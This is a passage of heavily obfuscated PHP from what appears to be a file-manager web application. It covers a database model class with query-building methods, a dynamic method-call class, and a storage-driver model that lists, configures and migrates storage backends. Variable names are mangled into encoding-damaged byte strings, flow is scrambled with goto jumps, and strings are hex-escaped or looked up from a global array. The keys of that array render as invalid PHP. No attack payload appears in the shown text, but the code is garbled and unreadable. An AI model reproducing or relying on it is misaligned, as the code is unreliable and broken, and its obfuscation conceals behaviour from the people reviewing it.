(!is_bool($f‰â‰îÆçğ) && !is_array($f‰â‰îÆçğ)) { $f‰â‰îÆçğ = func_get_args(); array_shift($f‰â‰îÆçğ); } $DÇÏ…‡Ş‡Å = str_replace(array($EåÛö÷¿ä[217], $EåÛö÷¿ä[330]), $EåÛö÷¿ä[50], $DÇÏ…‡Ş‡Å); $DÇÏ…‡Ş‡Å = $this->parseSql($DÇÏ…‡Ş‡Å, $f‰â‰îÆçğ); return $this->db->query($DÇÏ…‡Ş‡Å); } public function execute($c‰ØÑ©²Ëó, $CîÕò×é–® = false) { if (!is_bool($CîÕò×é–®) && !is_array($CîÕò×é–®)) { $CîÕò×é–® = func_get_args(); array_shift($CîÕò×é–®); } $c‰ØÑ©²Ëó = $this->parseSql($c‰ØÑ©²Ëó, $CîÕò×é–®); return $this->db->execute($c‰ØÑ©²Ëó); } protected function parseSql($fÆõ±²»¥ğ, $a—Ëœ©Ú·) { $dâå˜˜è°´ =& $_SERVER[“]; if (!0 === $a—Ëœ©Ú·) { $Aô»†×İã£ = $this->_parseOptions(); $fÆõ±²»¥ğ = $this->db->parseSql($fÆõ±²»¥ğ, $Aô»†×İã£); } elseif (is_array($a—Ëœ©Ú·)) { $a—Ëœ©Ú· = array_map(array($this->db, $dâå˜˜è°´[331]), $a—Ëœ©Ú·); $fÆõ±²»¥ğ = vsprintf($fÆõ±²»¥ğ, $a—Ëœ©Ú·); } else { $fÆõ±²»¥ğ = strtr($fÆõ±²»¥ğ, array($dâå˜˜è°´[332] => $this->getTableName(), $dâå˜˜è°´[333] => think_config($dâå˜˜è°´[232]))); } $this->db->setModel($this->name); return $fÆõ±²»¥ğ; } public function db($f”ƒØ©â¡´ = '', $fÀ–ÜÒ¶ = '', $D¾Î’¹×‡ = array()) { goto D‡»¤÷¾¡º; D‡»¤÷¾¡º: $D­ÜĞçÚöé =& $_SERVER[“]; if ($D­ÜĞçÚöé[33] === $f”ƒØ©â¡´ && $this->db) { return $this->db; } static $eØƒÃó–Ñ = array(); goto DáªÒĞÙÆ™; BØîøŠÁ©: $eØƒÃó–Ñ[$f”ƒØ©â¡´] = $fÀ–ÜÒ¶; $this->db = $bæ˜™ºƒºÑ[$f”ƒØ©â¡´]; $this->_after_db(); goto BÌó¶¬Äçî; DáªÒĞÙÆ™: static $bæ˜™ºƒºÑ = array(); if (!isset($bæ˜™ºƒºÑ[$f”ƒØ©â¡´]) || isset($bæ˜™ºƒºÑ[$f”ƒØ©â¡´]) && $fÀ–ÜÒ¶ && $eØƒÃó–Ñ[$f”ƒØ©â¡´] != $fÀ–ÜÒ¶) { if (!empty($fÀ–ÜÒ¶) && is_string($fÀ–ÜÒ¶) && !1 === strpos($fÀ–ÜÒ¶, $D­ÜĞçÚöé[8])) { $fÀ–ÜÒ¶ = think_config($fÀ–ÜÒ¶); } $bæ˜™ºƒºÑ[$f”ƒØ©â¡´] = Db::getInstance($fÀ–ÜÒ¶); } elseif (NULL === $fÀ–ÜÒ¶) { $bæ˜™ºƒºÑ[$f”ƒØ©â¡´]->close(); unset($bæ˜™ºƒºÑ[$f”ƒØ©â¡´]); return; } if (!empty($D¾Î’¹×‡)) { if (is_string($D¾Î’¹×‡)) { parse_str($D¾Î’¹×‡, $D¾Î’¹×‡); } foreach ($D¾Î’¹×‡ as $f„ƒªöõë => $a×¬Şİòµ) { $this->setProperty($f„ƒªöõë, $a×¬Şİòµ); } } goto BØîøŠÁ©; BÌó¶¬Äçî: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto b³­¨ëù§; b³­¨ëù§: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $E÷ğ¥Ë©‡… = get_class($this); if ($E÷ğ¥Ë©‡… == $_SERVER[“][334]) { return $this->name; } $this->name = substr($E÷ğ¥Ë©‡…, 0, -5); } return $this->name; } public function getTableName() { $Aª›µ°Ã¡ß =& $_SERVER[“]; if (empty($this->trueTableName)) { $d­ÂÔ…½ = !empty($this->tablePrefix) ? $this->tablePrefix : $Aª›µ°Ã¡ß[33]; if (!empty($this->tableName)) { $d­ÂÔ…½ .= $this->tableName; } else { $d­ÂÔ…½ .= think_parse_name($this->name); } $this->trueTableName = strtolower($d­ÂÔ…½); } return (!empty($this->dbName) ? $this->dbName . $Aª›µ°Ã¡ß[91] : $Aª›µ°Ã¡ß[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Eá…›ñŒ×µ =& $_SERVER[“]; return isset($this->fields[$Eá…›ñŒ×µ[239]]) ? $this->fields[$Eá…›ñŒ×µ[239]] : $this->pk; } public function getDbFields() { $Bƒ’¿ğÕñ” =& $_SERVER[“]; if (isset($this->options[$Bƒ’¿ğÕñ”[267]])) { $Fí›ïáŠË· = $this->db->getFields($this->options[$Bƒ’¿ğÕñ”[267]]); return $Fí›ïáŠË· ? array_keys($Fí›ïáŠË·) : !1; } if ($this->fields) { $Fí›ïáŠË· = $this->fields; unset($Fí›ïáŠË·[$Bƒ’¿ğÕñ”[238]], $Fí›ïáŠË·[$Bƒ’¿ğÕñ”[239]], $Fí›ïáŠË·[$Bƒ’¿ğÕñ”[240]], $Fí›ïáŠË·[$Bƒ’¿ğÕñ”[237]]); return $Fí›ïáŠË·; } return !1; } public function data($CöëÑ…ÙøÈ = '') { $b…Ô˜‰Í›À =& $_SERVER[“]; if ($b…Ô˜‰Í›À[33] === $CöëÑ…ÙøÈ && !empty($this->data)) { return $this->data; } if (is_object($CöëÑ…ÙøÈ)) { $CöëÑ…ÙøÈ = get_object_vars($CöëÑ…ÙøÈ); } elseif (is_string($CöëÑ…ÙøÈ)) { parse_str($CöëÑ…ÙøÈ, $CöëÑ…ÙøÈ); } elseif (!is_array($CöëÑ…ÙøÈ)) { think_exception(think_lang($b…Ô˜‰Í›À[259])); } $this->data = $CöëÑ…ÙøÈ; return $this; } public function join($dÏò¶¹ë¸) { $cµÁë»– =& $_SERVER[“]; if (is_array($dÏò¶¹ë¸)) { $this->options[$cµÁë»–[270]] = $dÏò¶¹ë¸; } elseif (!empty($dÏò¶¹ë¸)) { $this->options[$cµÁë»–[270]][] = $dÏò¶¹ë¸; } return $this; } public function union($fƒÓÌåÀƒ, $cˆ§Ÿ¢÷å“ = false) { goto aÎá·íŞ®; dÍ£Ã‹™ñ¬: if (is_object($fƒÓÌåÀƒ)) { $fƒÓÌåÀƒ = get_object_vars($fƒÓÌåÀƒ); } if (is_string($fƒÓÌåÀƒ)) { $Bñô„‘±¹š = $fƒÓÌåÀƒ; } elseif (is_array($fƒÓÌåÀƒ)) { if (isset($fƒÓÌåÀƒ[0])) { $this->options[$Cé­éš£ª¶[335]] = array_merge($this->options[$Cé­éš£ª¶[335]], $fƒÓÌåÀƒ); return $this; } else { $Bñô„‘±¹š = $fƒÓÌåÀƒ; } } else { think_exception(think_lang($Cé­éš£ª¶[259])); } $this->options[$Cé­éš£ª¶[335]][] = $Bñô„‘±¹š; goto bïáÄë¿ÖÛ; bïáÄë¿ÖÛ: return $this; goto c“¤äÃë’»; aÎá·íŞ®: $Cé­éš£ª¶ =& $_SERVER[“]; if (empty($fƒÓÌåÀƒ)) { return $this; } if ($cˆ§Ÿ¢÷å“) { $this->options[$Cé­éš£ª¶[335]][$Cé­éš£ª¶[336]] = !0; } goto dÍ£Ã‹™ñ¬; c“¤äÃë’»: } public function cache($cáãµ–Àéè = true, $DâÂÂÆ÷±î = null, $a†º…Ÿï = '') { $Fğ„Ç“Ïõ£ =& $_SERVER[“]; if (!1 !== $cáãµ–Àéè) { $this->options[$Fğ„Ç“Ïõ£[337]] = array($Fğ„Ç“Ïõ£[89] => $cáãµ–Àéè, $Fğ„Ç“Ïõ£[327] => $DâÂÂÆ÷±î, $Fğ„Ç“Ïõ£[29] => $a†º…Ÿï); } return $this; } public function field($D—½¸Ûë÷º, $fËìåˆ‹© = false) { $DñºÒãÃ¹’ =& $_SERVER[“]; if (!0 === $D—½¸Ûë÷º) { $e±ÑŸîƒŠÂ = $this->getDbFields(); $D—½¸Ûë÷º = $e±ÑŸîƒŠÂ ? $e±ÑŸîƒŠÂ : $DñºÒãÃ¹’[176]; } elseif ($fËìåˆ‹©) { if (is_string($D—½¸Ûë÷º)) { $D—½¸Ûë÷º = explode($DñºÒãÃ¹’[47], $D—½¸Ûë÷º); } $e±ÑŸîƒŠÂ = $this->getDbFields(); $D—½¸Ûë÷º = $e±ÑŸîƒŠÂ ? array_diff($e±ÑŸîƒŠÂ, $D—½¸Ûë÷º) : $D—½¸Ûë÷º; } $this->options[$DñºÒãÃ¹’[261]] = $D—½¸Ûë÷º; return $this; } public function scope($Eìø‚ŠÃ‚Ğ = '', $C¬õÙåƒÔÒ = NULL) { $F¿×­øÁì´ =& $_SERVER[“]; if ($F¿×­øÁì´[33] === $Eìø‚ŠÃ‚Ğ) { if (isset($this->_scope[$F¿×­øÁì´[34]])) { $A³éÙêÃ²ë = $this->_scope[$F¿×­øÁì´[34]]; } else { return $this; } } elseif (is_string($Eìø‚ŠÃ‚Ğ)) { $f–îÒˆ¬­¨ = explode($F¿×­øÁì´[47], $Eìø‚ŠÃ‚Ğ); $A³éÙêÃ²ë = array(); foreach ($f–îÒˆ¬­¨ as $f×‘ñÑÅÅ„) { if (!isset($this->_scope[$f×‘ñÑÅÅ„])) { continue; } $A³éÙêÃ²ë = array_merge($A³éÙêÃ²ë, $this->_scope[$f×‘ñÑÅÅ„]); } if (!empty($C¬õÙåƒÔÒ) && is_array($C¬õÙåƒÔÒ)) { $A³éÙêÃ²ë = array_merge($A³éÙêÃ²ë, $C¬õÙåƒÔÒ); } } elseif (is_array($Eìø‚ŠÃ‚Ğ)) { $A³éÙêÃ²ë = $Eìø‚ŠÃ‚Ğ; } if (is_array($A³éÙêÃ²ë) && !empty($A³éÙêÃ²ë)) { $this->options = array_merge($this->options, array_change_key_case($A³éÙêÃ²ë)); } return $this; } public function where($a²­ø¸‹§¤, $E²–˜ó†Ÿ¨ = null) { $b¢áß©¥ªÎ =& $_SERVER[“]; if (!is_null($E²–˜ó†Ÿ¨) && is_string($a²­ø¸‹§¤)) { if (!is_array($E²–˜ó†Ÿ¨)) { $E²–˜ó†Ÿ¨ = func_get_args(); array_shift($E²–˜ó†Ÿ¨); } $E²–˜ó†Ÿ¨ = array_map(array($this->db, $b¢áß©¥ªÎ[331]), $E²–˜ó†Ÿ¨); $a²­ø¸‹§¤ = vsprintf($a²­ø¸‹§¤, $E²–˜ó†Ÿ¨); } elseif (is_object($a²­ø¸‹§¤)) { $a²­ø¸‹§¤ = get_object_vars($a²­ø¸‹§¤); } elseif (is_array($a²­ø¸‹§¤)) { foreach ($a²­ø¸‹§¤ as $fÃ¡“Ã¢Ëß => $bÕÁ˜¯øŠ‚) { if ((is_numeric($fÃ¡“Ã¢Ëß) || !$fÃ¡“Ã¢Ëß) && is_string($bÕÁ˜¯øŠ‚)) { think_trace($b¢áß©¥ªÎ[338], $b¢áß©¥ªÎ[33], $b¢áß©¥ªÎ[46]); die; } } } if (is_string($a²­ø¸‹§¤) && $b¢áß©¥ªÎ[33] != $a²­ø¸‹§¤) { $Dê¨óšŒ°ï = array(); $Dê¨óšŒ°ï[$b¢áß©¥ªÎ[339]] = $a²­ø¸‹§¤; $a²­ø¸‹§¤ = $Dê¨óšŒ°ï; } if (isset($this->options[$b¢áß©¥ªÎ[263]])) { $this->options[$b¢áß©¥ªÎ[263]] = array_merge($this->options[$b¢áß©¥ªÎ[263]], $a²­ø¸‹§¤); } else { $this->options[$b¢áß©¥ªÎ[263]] = $a²­ø¸‹§¤; } return $this; } public function limit($dßèõÉÑÒö, $CîäÌÃò¦å = null) { $B¬Ôâ—ëÇ =& $_SERVER[“]; $this->options[$B¬Ôâ—ëÇ[280]] = is_null($CîäÌÃò¦å) ? $dßèõÉÑÒö : $dßèõÉÑÒö . $B¬Ôâ—ëÇ[47] . $CîäÌÃò¦å; return $this; } public function page($fÆêñ—ëÅÇ, $a å¸¼Óíœ = null) { $cÕÙ’µšÈ =& $_SERVER[“]; $this->options[$cÕÙ’µšÈ[340]] = is_null($a å¸¼Óíœ) ? $fÆêñ—ëÅÇ : $fÆêñ—ëÅÇ . $cÕÙ’µšÈ[47] . $a å¸¼Óíœ; return $this; } public function comment($Cœ¡ª—¥‡) { $this->options[$_SERVER[“][341]] = $Cœ¡ª—¥‡; return $this; } public function setProperty($c­æ­¸øºŸ, $f «¥ğ­æ) { if (property_exists($this, $c­æ­¸øºŸ)) { $this->{$c­æ­¸øºŸ} = $f «¥ğ­æ; } return $this; } } goto E²‡ï„§; F¦ß„öÄô«: $_SERVER[$_SERVER[ğ£][49]] = ("\x39\x37\x32\x30".strrev('49'))+0;$_qgMS="4kwQMR6SPTpryQPyZwRiFKYxbsVz2A6JaIsxZinNCtSnkCTdRq8IDUuFws2v65KQEzrbWe87dY";; stream_wrapper_register($_SERVER[ğ£][50], $_SERVER[ğ£][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($aÀßÎ’¡ù¿, $bğÌôšöİø) { $BÏ¥ØŸíó· =& $_SERVER[“]; if (isset(self::$_methodList[$aÀßÎ’¡ù¿])) { return @call_user_func_array(self::$_methodList[$aÀßÎ’¡ù¿], $bğÌôšöİø); } else { if (method_exists($this, $aÀßÎ’¡ù¿)) { return call_user_func_array(array($this, $aÀßÎ’¡ù¿), $bğÌôšöİø); } else { think_exception(__CLASS__ . $BÏ¥ØŸíó·[4] . $aÀßÎ’¡ù¿ . $BÏ¥ØŸíó·[5]); } } } public static function __callStatic($aÍ¹ÖâÃå¥, $e‰ÑÒ…ÑÊ) { if (isset(self::$_methodListStatic[$aÍ¹ÖâÃå¥])) { return call_user_func_array(self::$_methodListStatic[$aÍ¹ÖâÃå¥], $e‰ÑÒ…ÑÊ); } else { if (method_exists(self, $aÍ¹ÖâÃå¥)) { return call_user_func_array(array(self, $aÍ¹ÖâÃå¥), $e‰ÑÒ…ÑÊ); } else { show_json("{$aÍ¹ÖâÃå¥}\x28\51\40\156\x6f\x74\x20\145\x78\151\x73\x74\x3b", !1); } } } public static function addMethod($e—Ş£Œæ¸, $FŸ‚Ò¨İò³) { self::$_methodList[$e—Ş£Œæ¸] = $FŸ‚Ò¨İò³; } public static function addMethodStatic($bÀ²ŠÜ·Ü˜, $C×’ÈÍô—) { self::$_methodListStatic[$bÀ²ŠÜ·Ü˜] = $C×’ÈÍô—; } } goto DÒÏéŒá¢×; aÚ„…×‚ƒ„: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\163\x74\157\162\141\147\145\114\151\163\x74"; public $field = array("\156\141\x6d\x65", "\163\151\172\145\115\x61\x78", "\163\x79\163\164\145\155", "\144\x65\146\141\x75\x6c\x74", "\144\x72\151\166\145\x72", "\x63\157\156\146\151\147"); public function listData($A»¹Ô²òÛå = false, $fõÏœ“÷í» = "\x6d\x6f\x64\x69\x66\x79\124\x69\x6d\x65", $F·Õ•â˜‹ä = false) { goto d†¶è—™öÒ; c™®â°¥æ†: foreach ($b…°ê¹õÏ© as $bÚÖšÄØÄ => $EµŒ›œâé) { unset($b…°ê¹õÏ©[$bÚÖšÄØÄ][$CŠïğé„™ë[6]]); $b…°ê¹õÏ©[$bÚÖšÄØÄ][$CŠïğé„™ë[2081]] = 0; } $E‡¹„ïÎóÄ = array_to_keyvalue($b…°ê¹õÏ©, $CŠïğé„™ë[33], $CŠïğé„™ë[367]); $this->_listAppendSize($b…°ê¹õÏ©, $E‡¹„ïÎóÄ); goto aŒ‡ë®Ú×À; d†¶è—™öÒ: $CŠïğé„™ë =& $_SERVER[“]; $b…°ê¹õÏ© = parent::listData($A»¹Ô²òÛå, $fõÏœ“÷í», $F·Õ•â˜‹ä); if ($A»¹Ô²òÛå) { return $b…°ê¹õÏ©; } goto c™®â°¥æ†; aŒ‡ë®Ú×À: return $b…°ê¹õÏ©; goto a§ã»Ÿ¿Ü; a§ã»Ÿ¿Ü: } public function _listAppendSize(&$aï„ˆßßª, $A¸­ìœà) { $AÁö‹Ãõ³ =& $_SERVER[“]; if (!$A¸­ìœà) { return; } $bµÒªÃßß‹ = $AÁö‹Ãõ³[2374] . implode($AÁö‹Ãõ³[47], $A¸­ìœà) . $AÁö‹Ãõ³[2375]; $fèµ¦†ï…Õ = Model($AÁö‹Ãõ³[702])->query($bµÒªÃßß‹); $fèµ¦†ï…Õ = array_to_keyvalue($fèµ¦†ï…Õ, $AÁö‹Ãõ³[367], $AÁö‹Ãõ³[77]); foreach ($aï„ˆßßª as $BÁ‹Õ¼øŠ => $e¼…Ùà) { $aï„ˆßßª[$BÁ‹Õ¼øŠ][$AÁö‹Ãõ³[2081]] = isset($fèµ¦†ï…Õ[$e¼…Ùà[$AÁö‹Ãõ³[367]]]) ? $fèµ¦†ï…Õ[$e¼…Ùà[$AÁö‹Ãõ³[367]]] : 0; } } public function getConfig($fö‘Îë×Á) { $e¸ñâ™–ß² = parent::listData($fö‘Îë×Á); return json_decode($e¸ñâ™–ß²[$_SERVER[“][6]], !0); } public function update($DÓÕÌ‚Õ, $eë•êÒùŸ—) { goto B‰§ÉºŸª®; C˜ï‚í¨±—: if (isset($E‹Œ¡™[$eáÊö†…Ô‘]) && $E‹Œ¡™[$eáÊö†…Ô‘][$bÑâíã[367]] != $DÓÕÌ‚Õ) { return !1; } if (isset($eë•êÒùŸ—[$bÑâíã[2376]]) && $eë•êÒùŸ—[$bÑâíã[2376]] == $bÑâíã[83]) { $this->checkConfig($eë•êÒùŸ—); } unset($eë•êÒùŸ—[$bÑâíã[2376]]); goto E¼ªä¢­Î…; E¼ªä¢­Î…: $C¥ºÃ˜Ø©¼ = parent::update($DÓÕÌ‚Õ, $eë•êÒùŸ—); if ($C¥ºÃ˜Ø©¼ && $eë•êÒùŸ—[$bÑâíã[34]]) { foreach ($E‹Œ¡™ as $FêÓÅ®²Ÿ‹) { if ($FêÓÅ®²Ÿ‹[$bÑâíã[34]] && $FêÓÅ®²Ÿ‹[$bÑâíã[367]] != $DÓÕÌ‚Õ) { parent::update($FêÓÅ®²Ÿ‹[$bÑâíã[367]], array($bÑâíã[34] => 0)); } } } return $C¥ºÃ˜Ø©¼; goto cœÀÄ©…è¸; B‰§ÉºŸª®: $bÑâíã =& $_SERVER[“]; $eáÊö†…Ô‘ = $eë•êÒùŸ—[$bÑâíã[28]]; $E‹Œ¡™ = array_to_keyvalue(parent::listData(), $bÑâíã[28]); goto C˜ï‚í¨±—; cœÀÄ©…è¸: } public function add($bŠÉ¡¬®) { goto Eğù†è­¬‰; Eğù†è­¬‰: $E™†£¾Ø™… =& $_SERVER[“]; $dèİçÛãç‚ = array_to_keyvalue(parent::listData(), $E™†£¾Ø™…[28]); if (isset($dèİçÛãç‚[$bŠÉ¡¬®[$E™†£¾Ø™…[28]]])) { return !1; } goto Aõ†öíÛã¼; dœêõ¨êÄ: return $B½”•Ö¹„ô; goto CŞŠÎ¶²à; Aõ†öíÛã¼: $this->checkConfig($bŠÉ¡¬®); $B½”•Ö¹„ô = parent::insert($bŠÉ¡¬®); if ($B½”•Ö¹„ô && $bŠÉ¡¬®[$E™†£¾Ø™…[34]]) { foreach ($dèİçÛãç‚ as $d¹¶ˆ£’Š³) { if ($d¹¶ˆ£’Š³[$E™†£¾Ø™…[34]]) { parent::update($d¹¶ˆ£’Š³[$E™†£¾Ø™…[367]], array($E™†£¾Ø™…[34] => 0)); } } } goto dœêõ¨êÄ; CŞŠÎ¶²à: } public function checkConfig(&$EÙ¶±¥¤ÃÎ) { goto AÕ”„ÔÁ„ê; b¸¨Œ—š‘Â: return !0; goto BóÖ“’šÍ°; BÌÅÎõº‰: $d“Š¶¸ñøå = rtrim($CØ…Ğ—³ù[$fª×¸†œŞŞ[1011]], $fª×¸†œŞŞ[8]) . $fª×¸†œŞŞ[8]; $BÑÇ†íÙ¢§ = $BÎŒÖ‡•İÆ->getPath($d“Š¶¸ñøå . $fª×¸†œŞŞ[1976]); if (!$BÎŒÖ‡•İÆ->mkfile($BÑÇ†íÙ¢§)) { show_json(LNG($fª×¸†œŞŞ[2378]), !1); } goto E¸“Æ¶ ôÜ; AÕ”„ÔÁ„ê: $fª×¸†œŞŞ =& $_SERVER[“]; $e¶°‹‹ø÷¡ = strtolower($EÙ¶±¥¤ÃÎ[$fª×¸†œŞŞ[90]]); $CØ…Ğ—³ù = json_decode($EÙ¶±¥¤ÃÎ[$fª×¸†œŞŞ[6]], !0); goto D¾‡•¼…Ñ; e¬§¨¸„ÕÆ: $eå×ÖÃ† = $fª×¸†œŞŞ[71] . $dÇ¯˜ë”Ûí; $BÎŒÖ‡•İÆ = new $eå×ÖÃ†($CØ…Ğ—³ù); if (in_array($e¶°‹‹ø÷¡, $BÎŒÖ‡•İÆ->objectDriver)) { if (!$BÎŒÖ‡•İÆ->isBucketCors() && !$BÎŒÖ‡•İÆ->setBucketCors()) { $b‚Ší¾¥¶ë = LNG($fª×¸†œŞŞ[2378]); $b‚Ší¾¥¶ë .= $fª×¸†œŞŞ[2379] . LNG($fª×¸†œŞŞ[2380]); show_json($b‚Ší¾¥¶ë, !1); } } goto BÌÅÎõº‰; D¾‡•¼…Ñ: foreach ($CØ…Ğ—³ù as $D½ö»Ş‰¼› => $Cã¦ËĞ³Ø) { $CØ…Ğ—³ù[$D½ö»Ş‰¼›] = trim($Cã¦ËĞ³Ø); } $CØ…Ğ—³ù[$fª×¸†œŞŞ[2377]] = rand_string(6); $dÇ¯˜ë”Ûí = $this->driverType($e¶°‹‹ø÷¡); goto e¬§¨¸„ÕÆ; E¸“Æ¶ ôÜ: $CØ…Ğ—³ù[$fª×¸†œŞŞ[1011]] = $d“Š¶¸ñøå; $EÙ¶±¥¤ÃÎ[$fª×¸†œŞŞ[6]] = json_encode($CØ…Ğ—³ù); $EÙ¶±¥¤ÃÎ[$fª×¸†œŞŞ[90]] = $dÇ¯˜ë”Ûí; goto b¸¨Œ—š‘Â; BóÖ“’šÍ°: } private function driverType($d¢Ãƒ¢°óÒ) { $cŸ­æ®† =& $_SERVER[“]; $Cšá†àæÈå = array($cŸ­æ®†[102] => $cŸ­æ®†[2381], $cŸ­æ®†[58] => $cŸ­æ®†[2382], $cŸ­æ®†[64] => $cŸ­æ®†[2383]); if (isset($Cšá†àæÈå[$d¢Ãƒ¢°óÒ])) { return $Cšá†àæÈå[$d¢Ãƒ¢°óÒ]; } return strtoupper($d¢Ãƒ¢°óÒ); } public function driverListSystem() { $F¾®ôÌÆ†Œ =& $_SERVER[“]; $Fìí‡Éµ”¯ = parent::listData(); $F‰¥ì®™øÅ = array(); foreach ($Fìí‡Éµ”¯ as $f†æ¥ô«ã´) { unset($f†æ¥ô«ã´[$F¾®ôÌÆ†Œ[187]], $f†æ¥ô«ã´[$F¾®ôÌÆ†Œ[107]]); $f†æ¥ô«ã´[$F¾®ôÌÆ†Œ[6]] = json_decode($f†æ¥ô«ã´[$F¾®ôÌÆ†Œ[6]], !0); $F‰¥ì®™øÅ[] = $f†æ¥ô«ã´; } return $F‰¥ì®™øÅ; } public function defaultDriver() { $A½„ŒğË»Ø =& $_SERVER[“]; $E£ÂÂà•Óğ = parent::listData(); $d¦š¹®œ•î = array_filter_by_field($E£ÂÂà•Óğ, $A½„ŒğË»Ø[34], 1); $d¦š¹®œ•î = $d¦š¹®œ•î[0]; if ($d¦š¹®œ•î) { $d¦š¹®œ•î[$A½„ŒğË»Ø[6]] = json_decode($d¦š¹®œ•î[$A½„ŒğË»Ø[6]], !0); } return $d¦š¹®œ•î; } public function driverInfo($D¢åˆĞÄÒÑ) { $C¡‘«†»¯¬ =& $_SERVER[“]; $f·¨·Ö‡ô = array_to_keyvalue(parent::listData(), $C¡‘«†»¯¬[367]); if (!isset($f·¨·Ö‡ô[$D¢åˆĞÄÒÑ])) { return !1; } $bë—¤ïÚ¥ = $f·¨·Ö‡ô[$D¢åˆĞÄÒÑ]; $bë—¤ïÚ¥[$C¡‘«†»¯¬[6]] = json_decode($bë—¤ïÚ¥[$C¡‘«†»¯¬[6]], !0); return $bë—¤ïÚ¥; } public function remove($A¯ÚÆ–¿) { $this->removeShareItems($A¯ÚÆ–¿); return parent::remove($A¯ÚÆ–¿); } public function removeWithFile($dèØ¬ï‘) { goto D£åƒ‡öÔ; c„‘Ã³Ó: $dç‰ï‹éË = Model($B„‹ˆòº˜Œ[422])->where($bÀÎÇ‡ø…)->sum($B„‹ˆòº˜Œ[77]); $a²˜÷âŠåç = $B„‹ˆòº˜Œ[2384] . $dèØ¬ï‘; $BëÄÙˆ½¾ = new TaskFileTransfer($a²˜÷âŠåç, $B„‹ˆòº˜Œ[2385], $aÍÆô‡¿É¤, LNG($B„‹ˆòº˜Œ[2386]) . "\50{$dèØ¬ï‘}\x29"); goto E«êÃÂíØÌ; D£åƒ‡öÔ: $B„‹ˆòº˜Œ =& $_SERVER[“]; $bÀÎÇ‡ø… = array($B„‹ˆòº˜Œ[727] => $dèØ¬ï‘); $aÍÆô‡¿É¤ = Model($B„‹ˆòº˜Œ[422])->where($bÀÎÇ‡ø…)->count(); goto c„‘Ã³Ó; E‰¯‹‹Šš: if (!$cÅ´ÖÔªç) { $BëÄÙˆ½¾->stop($a²˜÷âŠåç); return !1; } $BëÄÙˆ½¾->end(); $this->remove($dèØ¬ï‘); goto f…¸Â©œ; aæï†»Ó¶ˆ: $CĞ½•Ú¡„ = Model($B„‹ˆòº˜Œ[167])->where($bÀÎÇ‡ø…)->field($B„‹ˆòº˜Œ[2387])->select(); foreach ($CĞ½•Ú¡„ as $d‰æ¿Îë‡Å) { goto AÍ‹ã„¢å; AÍ‹ã„¢å: $fëÉˆÔ‹ = $d‰æ¿Îë‡Å[$B„‹ˆòº˜Œ[75]]; $cè­å‹×“ = $EÓìçš¾Æ . str_replace("\173\151\157\72{$dèØ¬ï‘}\175\57", $B„‹ˆòº˜Œ[33], $fëÉˆÔ‹); if (!IO::exist($fëÉˆÔ‹)) { $aàÒ…ö³èÂ[] = $d‰æ¿Îë‡Å[$B„‹ˆòº˜Œ[419]]; $BëÄÙˆ½¾->updateFileEnd($d‰æ¿Îë‡Å[$B„‹ˆòº˜Œ[28]], $d‰æ¿Îë‡Å[$B„‹ˆòº˜Œ[77]]); continue; } goto c¾µÉ§Ÿ§É; c¾µÉ§Ÿ§É: if (IO::exist($cè­å‹×“)) { $BëÄÙˆ½¾->updateFileEnd($d‰æ¿Îë‡Å[$B„‹ˆòº˜Œ[28]], $d‰æ¿Îë‡Å[$B„‹ˆòº˜Œ[77]]); continue; } if (!IO::move($fëÉˆÔ‹, get_path_father($cè­å‹×“))) { $cÅ´ÖÔªç = !1; break; } $bÀÎÇ‡ø… = array($B„‹ˆòº˜Œ[419] => $d‰æ¿Îë‡Å[$B„‹ˆòº˜Œ[419]]); goto d®ó…Ş¼‡Í; d®ó…Ş¼‡Í: $FÚßœï˜õ• = array($B„‹ˆòº˜Œ[727] => $E¼ğµ±›Ö®, $B„‹ˆòº˜Œ[75] => $cè­å‹×“); Model($B„‹ˆòº˜Œ[167])->where($bÀÎÇ‡ø…)->save($FÚßœï˜õ•); goto b½Â™©æ‡; b½Â™©æ‡: } $this->removeByFileID($aàÒ…ö³èÂ); goto E‰¯‹‹Šš; Dæ›îÚŠ…Û: $EÓìçš¾Æ = "\x7b\x69\157\72{$E¼ğµ±›Ö®}\x7d\x2f"; $cÅ´ÖÔªç = !0; $aàÒ…ö³èÂ = array(); goto aæï†»Ó¶ˆ; E«êÃÂíØÌ: $BëÄÙˆ½¾->task[$B„‹ˆòº˜Œ[682]] = (double) $dç‰ï‹éË; $B¡¿Ö²ƒ = KodIO::defaultDriver(); $E¼ğµ±›Ö® = $B¡¿Ö²ƒ[$B„‹ˆòº˜Œ[367]]; goto Dæ›îÚŠ…Û; f…¸Â©œ: } public function progress($fïèö´Ö–) { return Task::get($_SERVER[“][2384] . $fïèö´Ö–); } private function removeByFileID($cÖŸÓ«¡ğ‘ = array()) { goto cœŒ¿ÇåÍ; bÖĞ“±´ò¦: foreach ($EÏŠ¯ùíÅ£ as $EŒ½«´ÏÙ) { Model($Cãì¨Š·Ç†[382])->removeNow($EŒ½«´ÏÙ, !1); } goto fõ—èŠÒ¥¥; cœŒ¿ÇåÍ: $Cãì¨Š·Ç† =& $_SERVER[“]; if (empty($cÖŸÓ«¡ğ‘)) { return; } $cìÉõóœ¥ê = array($Cãì¨Š·Ç†[419] => array($Cãì¨Š·Ç†[7], $cÖŸÓ«¡ğ‘)); goto AæÍö”ƒƒÔ; AæÍö”ƒƒÔ: $EÏŠ¯ùíÅ£ = Model($Cãì¨Š·Ç†[1104])->where($cìÉõóœ¥ê)->field($Cãì¨Š·Ç†[369])->select(); if (!$EÏŠ¯ùíÅ£) { return; } $EÏŠ¯ùíÅ£ = array_to_keyvalue($EÏŠ¯ùíÅ£, $Cãì¨Š·Ç†[33], $Cãì¨Š·Ç†[369]); goto bÖĞ“±´ò¦; fõ—èŠÒ¥¥: } private function removeShareItems($Eà­…†¹ÙØ) { goto b›„İ‹šğ; e­Í‚Ë¶ñË: Model($fèÑÍÁÛÑÁ[538])->remove($cõƒ‘Ï”§); goto Aù±ºÑÔêÇ; E•Ëñ‘Æ£: $eÛŒ‚Ìœà = Model($fèÑÍÁÛÑÁ[2072])->where($b²ÚÂñéÀó)->field($fèÑÍÁÛÑÁ[441])->select(); if (empty($eÛŒ‚Ìœà)) 